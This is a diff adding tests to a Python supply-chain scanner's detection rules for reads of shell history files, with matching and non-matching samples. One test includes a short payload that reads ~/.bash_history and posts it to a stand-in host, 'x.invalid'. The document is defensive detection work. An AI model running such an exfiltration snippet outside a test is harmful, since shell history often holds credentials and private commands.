@@ -325,6 +325,46 @@ def test_proc_self_status_pattern_is_live():
     assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
 
 
+def test_fs_enum_does_not_flag_the_word_history():
+    # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module
+    # mentioning "history" anywhere before "read" anywhere was filesystem enumeration.
+    # Combined with a network call that is a CRITICAL, which is how httpx, urllib3,
+    # IPython and torch all ended up in the baseline for reasons unrelated to files.
+    for s in (
+        "history: list[Response] | None = None\n\ndef read(self): pass\n",
+        "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
+        "if retries is not None and retries.history:\n    resp.read()\n",
+        'if "history" in b:\n    b.read()\n',
+    ):
+        assert not sp.RE_FS_ENUM.search(s), s
+
+
+def test_fs_enum_still_flags_real_history_file_reads():
+    # And the half that matters must fire. The two literals this replaces were
+    # `\b\.bash_history\b` / `\b\.zsh_history\b`: \b sits between two non-word
+    # characters in "~/.bash_history", so neither could ever match -- the same
+    # unsatisfiable-\b bug as /proc/self/status above. Every form below was missed.
+    for s in (
+        'open(os.path.expanduser("~/.bash_history")).read()',
+        "p = Path.home() / '.zsh_history'",
+        'f = open("/root/.python_history")',
+        "open(os.path.expanduser('~/.history'))",
+        'hist = os.environ.get("HISTFILE")',
+    ):
+        assert sp.RE_FS_ENUM.search(s), s
+
+
+def test_history_theft_plus_network_is_critical():
+    payload = (
+        "import requests\n"
+        "data = open(os.path.expanduser('~/.bash_history')).read()\n"
+        "requests.post('http://x.invalid', data = data)\n"
+    )
+    findings = sp.check_py_file(payload, "pkg/_x.py", "pkg")
+    fs = [f for f in findings if "Enumerates filesystem" in f.check]
+    assert fs and fs[0].severity == sp.CRITICAL, findings
+
+
 def _mk(
     sev,
     pkg,
